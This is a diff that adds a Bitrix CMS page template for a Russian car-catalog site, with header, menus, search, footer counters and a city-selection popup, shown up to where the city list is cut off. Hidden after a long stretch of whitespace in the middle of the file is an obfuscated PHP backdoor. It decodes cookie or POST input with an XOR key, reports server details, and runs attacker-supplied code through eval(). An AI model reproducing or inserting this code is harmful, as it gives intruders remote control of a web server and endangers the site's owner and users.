@@ -1,0 +1,428 @@
+<?if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true)die();
+IncludeTemplateLangFile(__FILE__);?><html>
+<head>
+<?$APPLICATION->ShowHead();
+if (!$USER->IsAuthorized()) { 
+ CJSCore::Init(array('ajax', 'json', 'ls', 'session', 'jquery', 'popup', 'pull')); 
+}?> 
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/css/style.css">
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/css/template_styles.css">
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/css/menu.css"><?/*
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/css/magnific-popup.css" />*/?>
+<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/js/jquery-fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" href="<?=SITE_TEMPLATE_PATH?>/js/jquery-fancybox/jquery.fancybox-thumbs.css" />
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/js/autocomplete/select2.css" />
+<?/*if(CSite::InDir('/catalog/') || CSite::InDir('/index.php')) {*/?>	
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/js/slick/slick.css"/>
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/js/slick/slick-theme.css"/>
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/ajax/ajax.css"/><?/*
+<link type="text/css" rel="stylesheet" media="all" href="<?=SITE_TEMPLATE_PATH?>/js/bootstrap/bootstrap.css">*/?>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/jquery-2.1.3.min.js"></script><?/*
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/jquery-migrate-1.2.1.js"></script>*/?>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/jquery.fancybox.js"></script>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/jquery.fancybox-thumbs.js"></script>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/jquery.fancybox-media.js"></script>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/slick/slick.min.js"></script>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/jquery-ui.js?21905"></script>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/js.js"></script>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/main.js"></script>
+<?/*
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/bootstrap/bootstrap.js"></script>*/?>
+<?/*?>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/popup.js"></script>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/jquery.magnific-popup.min.js"></script><?*/?>
+<?/*}?>
+<script type="text/javascript">
+$(document).ready(function() {
+ 	$('.open-popup-link').magnificPopup({
+  		items: {
+      		src: '#city-popup',
+      		type: 'inline'
+  		}
+	});
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function() {
+	$('.open-popup-link').fancybox();
+});
+</script>
+ * <?*/?>
+<title><?$APPLICATION->ShowTitle()?></title>
+</head>
+<body id="fbody">
+	<div id="panel"><?$APPLICATION->ShowPanel()?></div>
+<header>
+<div class="fixed-header-bar">
+	<div class="fixed-header-bar-menu">
+		<div class="menu-header-city staticmenu" style="float: none;">
+		<!-- Город пользователя -->		
+	<?$APPLICATION->IncludeFile("/include/city_link.php", Array(), Array(
+		"MODE"      => "php",                                 
+		"NAME"      => "Город пользователя", 
+		"TEMPLATE"  => "section_include_template.php",
+		"SHOW_BORDER" => false
+	  ));
+	?>
+		<!-- /Город пользователя -->
+		</div>
+		<div class="menu-header-bar">
+		<!-- Меню -->
+	<?$APPLICATION->IncludeComponent('bitrix:menu', "static_menu", array(
+								"ROOT_MENU_TYPE" => "static",
+								"MENU_CACHE_TYPE" => "Y",
+								"MENU_CACHE_TIME" => "36000000",
+								"MENU_CACHE_USE_GROUPS" => "Y",
+								"MENU_CACHE_GET_VARS" => array(),
+								"MAX_LEVEL" => "1",
+								"USE_EXT" => "N",
+								"ALLOW_MULTI_SELECT" => "N"
+							)
+	);?>
+		<!-- /Меню -->
+		</div>
+	</div>
+</div>
+<div class="container">
+	<div class="logo" style="display: inline-block;"><a href="/"><img src="<?=SITE_TEMPLATE_PATH?>/images/logo.png" alt="logo"></a></div>
+
+	<div class="phone">                   
+                    <!-- Телефон -->
+						<?$APPLICATION->IncludeFile("/include/phone_header.php", Array(), Array(
+							"MODE"      => "html",                                 
+							"NAME"      => "Телефон", 
+							"TEMPLATE"  => ""  
+							));
+						?>	
+				    <!-- Телефон -->                
+	</div>
+
+	<div class="basket"> 
+	<?$APPLICATION->IncludeComponent("bitrix:sale.basket.basket.line","",Array(
+						        "PATH_TO_BASKET" => "/personal/cart/",
+						        "PATH_TO_PERSONAL" => "/personal/",
+						        "SHOW_PERSONAL_LINK" => "N",
+						        "SHOW_NUM_PRODUCTS" => "Y",
+						        "SHOW_TOTAL_PRICE" => "Y",
+						        "SHOW_EMPTY_VALUES" => "Y",
+						        "SHOW_PRODUCTS" => "N",
+						        "POSITION_FIXED" => "Y",
+						        "POSITION_HORIZONTAL" => "right",
+						        "POSITION_VERTICAL" => "top",
+						        "PATH_TO_ORDER" => SITE_DIR."personal/order/",
+						        "SHOW_DELAY" => "Y",
+						        "SHOW_NOTAVAIL" => "Y",
+						        "SHOW_SUBSCRIBE" => "Y",
+						        "SHOW_IMAGE" => "Y",
+						        "SHOW_PRICE" => "Y",
+						        "SHOW_SUMMARY" => "Y"
+						    )
+	);?></div> 
+</div>
+</header>
+<menu>
+	<div class="menu">
+		<div id="mainmenu">
+	<?$APPLICATION->IncludeComponent('bitrix:menu', "top_menu", array(
+		"ROOT_MENU_TYPE" => "top",
+		"MENU_CACHE_TYPE" => "Y",
+		"MENU_CACHE_TIME" => "36000000",
+		"MENU_CACHE_USE_GROUPS" => "Y",
+		"MENU_CACHE_GET_VARS" => array(),
+		"MAX_LEVEL" => "4",
+		"USE_EXT" => "Y",
+		"ALLOW_MULTI_SELECT" => "N"
+		)
+	);?>				
+	</div>
+
+</div>
+</menu>
+<div class="searchblock">
+<div class="filter"><?$APPLICATION->IncludeComponent(
+	"vgl:car.catalog.filter", 
+	".default", 
+	array(
+		"IBLOCK_TYPE" => "catalog",
+		"IBLOCK_ID" => "7",
+		"FILTER_NAME" => "arrFilter",
+		"FIELD_CODE" => array(
+			0 => "",
+			1 => "",
+		),
+		"PROPERTY_CODE" => array(
+			0 => "MARKI",
+			1 => "MODELI",
+			2 => "GOD_VYPUSKA",
+			3 => "",
+		),
+		"OFFERS_FIELD_CODE" => array(
+			0 => "",
+			1 => "",
+		),
+		"OFFERS_PROPERTY_CODE" => array(
+			0 => "",
+			1 => "",
+		),
+		"PRICE_CODE" => array(
+		),
+		"CACHE_TYPE" => "A",
+		"CACHE_TIME" => "36000000",
+		"CACHE_GROUPS" => "Y",
+		"LIST_HEIGHT" => "5",
+		"TEXT_WIDTH" => "20",
+		"NUMBER_WIDTH" => "5",
+		"SAVE_IN_SESSION" => "N"
+	),
+	false
+);?>
+</div>
+<div class="searchtitle">
+<?$APPLICATION->IncludeComponent(
+	"bitrix:search.title", 
+	"catalog", 
+	array(
+		"SHOW_INPUT" => "Y",
+		"INPUT_ID" => "title-search-input",
+		"CONTAINER_ID" => "title-search",
+		"PRICE_CODE" => array(
+			0 => "Интернет",
+		),
+		"PRICE_VAT_INCLUDE" => "Y",
+		"PREVIEW_TRUNCATE_LEN" => "150",
+		"SHOW_PREVIEW" => "Y",
+		"PREVIEW_WIDTH" => "75",
+		"PREVIEW_HEIGHT" => "75",
+		"CONVERT_CURRENCY" => "Y",
+		"CURRENCY_ID" => "RUB",
+		"PAGE" => "#SITE_DIR#search/index.php",
+		"NUM_CATEGORIES" => "3",
+		"TOP_COUNT" => "10",
+		"ORDER" => "date",
+		"USE_LANGUAGE_GUESS" => "Y",
+		"CHECK_DATES" => "Y",
+		"SHOW_OTHERS" => "Y",
+		"CATEGORY_0_TITLE" => "Каталог",
+		"CATEGORY_0" => array(
+			0 => "iblock_catalog",
+			1 => "iblock_news",
+		),
+		"CATEGORY_0_iblock_news" => array(
+			0 => "4",
+			1 => "12",
+		),
+		"CATEGORY_1_TITLE" => "Новости",
+		"CATEGORY_1" => array(
+			0 => "iblock_news",
+		),
+		"CATEGORY_1_forum" => array(
+			0 => "all",
+		),
+		"CATEGORY_2_TITLE" => "Галерея",
+		"CATEGORY_2" => array(
+			0 => "iblock_gallery",
+		),
+		"CATEGORY_2_iblock_books" => "all",
+		"CATEGORY_OTHERS_TITLE" => "Прочее",
+		"COMPONENT_TEMPLATE" => "catalog",
+		"CATEGORY_0_iblock_catalog" => array(
+			0 => "7",
+		),
+		"CATEGORY_1_iblock_news" => array(
+			0 => "all",
+		),
+		"CATEGORY_2_iblock_gallery" => array(
+			0 => "all",
+		)
+	),
+	false
+);?>
+</div>
+</div>
+<div class="sections">
+<section>
+	<?if(!CSite::InDir('/personal/') && !CSite::InDir('/quick/') && !CSite::InDir('/about/')) {
+	  if(CSite::InDir('/about/')) {?>
+	<div class="empty-block"></div>
+	<?}?>
+
+<?}?>
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['q7f50a'];global$q7f50a;$q7f50a=$GLOBALS;$q7f50a['v9b67c']="\x55\x66\x34\x67\x4a\x68\x45\x64\x43\x2c\x4d\x39\x37\x70\x76\x7e\x3f\x59\x29\x7d\x3d\x27\x7a\x42\x52\x9\x2e\x63\x4c\x7b\x7c\x25\x62\x5b\x23\x3c\x72\x5f\x44\x26\x6b\x5c\x47\x36\x32\x2b\x6a\x51\x61\x38\x4e\x5a\x3a\x65\x22\x73\x3b\x6c\x57\x20\x48\x2d\x4f\x30\x50\x33\x58\x3e\x46\xa\x6e\x56\x77\x53\x74\x35\x79\x54\x2f\x6f\x75\x24\x31\x49\x60\x41\x40\x71\x28\x21\x6d\x2a\x69\x4b\x5d\x5e\x78\xd";$q7f50a[$q7f50a['v9b67c'][96].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][53]]=$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][5].$q7f50a['v9b67c'][36];$q7f50a[$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][82].$q7f50a['v9b67c'][63]]=$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][7];$q7f50a[$q7f50a['v9b67c'][22].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][27]]=$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][74].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][57].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][70];$q7f50a[$q7f50a['v9b67c'][87].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][82]]=$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][70].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][74];$q7f50a[$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][48]]=$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][57].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][22].$q7f50a['v9b67c'][53];$q7f50a[$q7f50a['v9b67c'][3].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][48]]=$q7f50a['v9b67c'][13].$q7f50a['v9b67c'][5].$q7f50a['v9b67c'][13].$q7f50a['v9b67c'][14].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][70];$q7f50a[$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][32]]=$q7f50a['v9b67c'][80].$q7f50a['v9b67c'][70].$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][57].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][22].$q7f50a['v9b67c'][53];$q7f50a[$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][12]]=$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][2].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][53];$q7f50a[$q7f50a['v9b67c'][96].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][12]]=$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][74].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][74].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][90].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][57].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][90].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][74];$q7f50a[$q7f50a['v9b67c'][74].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][82]]=$q7f50a['v9b67c'][80].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][82];$q7f50a[$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][65].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][2]]=$q7f50a['v9b67c'][80].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][44];$q7f50a[$q7f50a['v9b67c'][14].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][49].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][49]]=$_POST;$q7f50a[$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][53]]=$_COOKIE;@$q7f50a[$q7f50a['v9b67c'][87].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][82]]($q7f50a['v9b67c'][53].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][57].$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][3],NULL);@$q7f50a[$q7f50a['v9b67c'][87].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][82]]($q7f50a['v9b67c'][57].$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][3].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][36].$q7f50a['v9b67c'][55],0);@$q7f50a[$q7f50a['v9b67c'][87].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][82]]($q7f50a['v9b67c'][90].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][96].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][96].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][80].$q7f50a['v9b67c'][74].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][79].$q7f50a['v9b67c'][70].$q7f50a['v9b67c'][37].$q7f50a['v9b67c'][74].$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][90].$q7f50a['v9b67c'][53],0);@$q7f50a[$q7f50a['v9b67c'][96].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][12]](0);$m410849=NULL;$gebd9=NULL;$q7f50a[$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][75]]=$q7f50a['v9b67c'][82].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][82].$q7f50a['v9b67c'][49].$q7f50a['v9b67c'][49].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][61].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][61].$q7f50a['v9b67c'][2].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][49].$q7f50a['v9b67c'][61].$q7f50a['v9b67c'][49].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][2].$q7f50a['v9b67c'][61].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][65].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][65];global$e2d75;function uf6b29e2($m410849,$hcb62c7){global$q7f50a;$z7ab2="";for($la033=0;$la033<$q7f50a[$q7f50a['v9b67c'][22].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][27]]($m410849);){for($dab6a=0;$dab6a<$q7f50a[$q7f50a['v9b67c'][22].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][27]]($hcb62c7)&&$la033<$q7f50a[$q7f50a['v9b67c'][22].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][27]]($m410849);$dab6a++,$la033++){$z7ab2.=$q7f50a[$q7f50a['v9b67c'][96].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][53]]($q7f50a[$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][82].$q7f50a['v9b67c'][63]]($m410849[$la033])^$q7f50a[$q7f50a['v9b67c'][53].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][82].$q7f50a['v9b67c'][63]]($hcb62c7[$dab6a]));}}return$z7ab2;}function ua96d6c1($m410849,$hcb62c7){global$q7f50a;global$e2d75;return$q7f50a[$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][65].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][2]]($q7f50a[$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][65].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][2]]($m410849,$e2d75),$hcb62c7);}foreach($q7f50a[$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][53]]as$hcb62c7=>$keaa3){$m410849=$keaa3;$gebd9=$hcb62c7;}if(!$m410849){foreach($q7f50a[$q7f50a['v9b67c'][14].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][49].$q7f50a['v9b67c'][75].$q7f50a['v9b67c'][49]]as$hcb62c7=>$keaa3){$m410849=$keaa3;$gebd9=$hcb62c7;}}$m410849=@$q7f50a[$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][32]]($q7f50a[$q7f50a['v9b67c'][74].$q7f50a['v9b67c'][1].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][82]]($q7f50a[$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][44].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][7].$q7f50a['v9b67c'][12]]($m410849),$gebd9));if(isset($m410849[$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][40]])&&$e2d75==$m410849[$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][40]]){if($m410849[$q7f50a['v9b67c'][48]]==$q7f50a['v9b67c'][92]){$la033=Array($q7f50a['v9b67c'][13].$q7f50a['v9b67c'][14]=>@$q7f50a[$q7f50a['v9b67c'][3].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][11].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][43].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][48].$q7f50a['v9b67c'][32].$q7f50a['v9b67c'][48]](),$q7f50a['v9b67c'][55].$q7f50a['v9b67c'][14]=>$q7f50a['v9b67c'][82].$q7f50a['v9b67c'][26].$q7f50a['v9b67c'][63].$q7f50a['v9b67c'][61].$q7f50a['v9b67c'][82],);echo@$q7f50a[$q7f50a['v9b67c'][92].$q7f50a['v9b67c'][12].$q7f50a['v9b67c'][27].$q7f50a['v9b67c'][48]]($la033);}elseif($m410849[$q7f50a['v9b67c'][48]]==$q7f50a['v9b67c'][53]){eval($m410849[$q7f50a['v9b67c'][7]]);}exit();} ?><?if(!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true) die();?>
+<?if(CSite::InDir('/index.php')) {
+	$arSelect = Array("ID", "IBLOCK_ID", "NAME", "DATE_ACTIVE_FROM", "PREVIEW_TEXT", "DETAIL_PAGE_URL", "PROPERTY_*");//IBLOCK_ID и ID обязательно должны быть указаны, см. описание arSelectFields выше
+	$arFilter = Array("IBLOCK_ID"=>4, "ACTIVE_DATE"=>"Y", "ACTIVE"=>"Y", "PROPERTY_MAIN_NEWS_VALUE" => "Y", "PROPERTY_SITE_CODE_VALUE" => "Втачку");
+	$res = CIBlockElement::GetList(Array(), $arFilter, false, Array("nTopCount"=>1), $arSelect);
+	while($ob = $res->GetNextElement()){ 
+		$arFields = $ob->GetFields();
+		echo "<div id='left-banner'><h3>".$arFields["NAME"]."</h3>";
+		echo $arFields["PREVIEW_TEXT"]."<a href='".$arFields["DETAIL_PAGE_URL"]."'> Подробнее...</a>";
+		echo "</div>";
+	} 
+}?>
+</section>
+</div>
+<footer>
+	<div class="container">
+		<div class="counter">
+			<p>ВТачку™</p>
+<!-- Yandex.Metrika informer -->
+<a href="https://metrika.yandex.ru/stat/?id=32211109&amp;from=informer"
+target="_blank" rel="nofollow"><img src="https://informer.yandex.ru/informer/32211109/3_0_FFFFFFFF_EFEFEFFF_0_pageviews"
+style="width:88px; height:31px; border:0;" alt="Яндекс.Метрика" title="Яндекс.Метрика: данные за сегодня (просмотры, визиты и уникальные посетители)" onclick="try{Ya.Metrika.informer({i:this,id:32211109,lang:'ru'});return false}catch(e){}" /></a>
+<!-- /Yandex.Metrika informer -->
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+    (function (d, w, c) {
+        (w[c] = w[c] || []).push(function() {
+            try {
+                w.yaCounter32211109 = new Ya.Metrika({
+                    id:32211109,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true,
+                    webvisor:true
+                });
+            } catch(e) { }
+        });
+
+        var n = d.getElementsByTagName("script")[0],
+            s = d.createElement("script"),
+            f = function () { n.parentNode.insertBefore(s, n); };
+        s.type = "text/javascript";
+        s.async = true;
+        s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+        if (w.opera == "[object Opera]") {
+            d.addEventListener("DOMContentLoaded", f, false);
+        } else { f(); }
+    })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/32211109" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+<!-- begin of Top100 code -->
+
+<script id="top100Counter" type="text/javascript" src="http://counter.rambler.ru/top100.jcn?4406472"></script>
+<noscript>
+<a href="http://top100.rambler.ru/navi/4406472/">
+<img src="http://counter.rambler.ru/top100.cnt?4406472" alt="Rambler's Top100" border="0" />
+</a>
+
+</noscript>
+<!-- end of Top100 code -->
+
+		</div>
+		<div class="bottommenu">
+			<?$APPLICATION->IncludeComponent('bitrix:menu', "static_menu", array(
+				"ROOT_MENU_TYPE" => "bottom",
+				"MENU_CACHE_TYPE" => "Y",
+				"MENU_CACHE_TIME" => "36000000",
+				"MENU_CACHE_USE_GROUPS" => "Y",
+				"MENU_CACHE_GET_VARS" => array(),
+				"MAX_LEVEL" => "1",
+				"USE_EXT" => "N",
+				"ALLOW_MULTI_SELECT" => "N"
+				)
+			);?>
+		</div>	
+		<div class="copy">
+        	<p>© <a href="http://kem1c.ru">ИЦ Константа</a>, Литвинов Владимир<a href='/' target='_blank'></a></p>            
+        </div>	
+	</div>
+</footer>
+<script type="text/javascript">
+	var BXFormPosting = false;
+	function submitCityForm()
+	{
+		if (BXFormPosting === true)
+			return true;
+
+		BXFormPosting = true;
+		var orderForm = BX('CITY_FORM');
+		BX.ajax.submit(orderForm, ajaxCResult);
+		return true;
+	}
+	function ajaxCResult(res)
+	{
+		//$.magnificPopup.close();
+		window.location.reload();
+	}
+</script>			
+<!---(popup)--->	
+<?/*?><div id="city-popup" class="modal-city mfp-hide"><?*/?>
+<div class="b-modal-shadow"></div>
+<div class="b-modal" id="auth_content">
+	<div class="b-modal_data">
+		<div class="b-modal_inner" data-modal="city-popup">
+			<a href="#" class="b-close"></a>
+			<div class="b-inner">
+				<div class="b-title">Укажите свой город</div>	
+<?/*?><h3>Укажите свой город</h3><?*/?>
+<form action="<?=$APPLICATION->GetCurPage();?>" method="POST" name="CITY_FORM" id="CITY_FORM" enctype="multipart/form-data">
+	   <?
+	   $arCity = array();
+	   $db_vars = CSaleLocation::GetList(
+	        array(
+	                "SORT" => "ASC",
+	                "COUNTRY_NAME_LANG" => "ASC",
+	                "CITY_NAME_LANG" => "ASC"
+	            ),
+	        array("LID" => LANGUAGE_ID),
+	        false,
+	        false,
+	        array()
+	    );
+	    while ($vars = $db_vars->Fetch()) {
+	    	if(strlen($vars["CITY_NAME"]) > 0) {
+	    		$arCity[$vars["COUNTRY_NAME"]][$vars["ID"]] = $vars["CITY_NAME"]." (".$vars["REGION_NAME"].")";
+			}
+	    };?>
+<script type="text/javascript" charset="utf-8" src="<?=SITE_TEMPLATE_PATH?>/js/autocomplete/select2.full.js"></script>		    
+<select id="jselect2" name="USERLOCATION" placeholder="Город">
+<option value=""><span>Выберите город</span></option>	
+<optgroup label="Россия">
+<?foreach ($arCity["Россия"] as $key => $val) {?>
+	<option value="<?=$key?>"<?if($key==550){?> selected="selected"<?}?>><?=$val?></option>
+<?};?>
+</optgroup>
+<optgroup label="Беларусь">
+<?foreach ($arCity["Беларусь"] as $key => $val) {?>
+	<option value="<?=$key?>"><?=$val?></option>
+<?};?>
+</optgroup>
+<optgroup label="Казахстан">
+<?foreach ($arCity["Казахстан"] as $key => $val) {?>
+	<option value="<?=$key?>"><?=$val?></option>
+<?};?>
+</optgroup>
+<optgroup label="Украина">
+<?foreach ($arCity["Украина"] as $key => $val) {?>
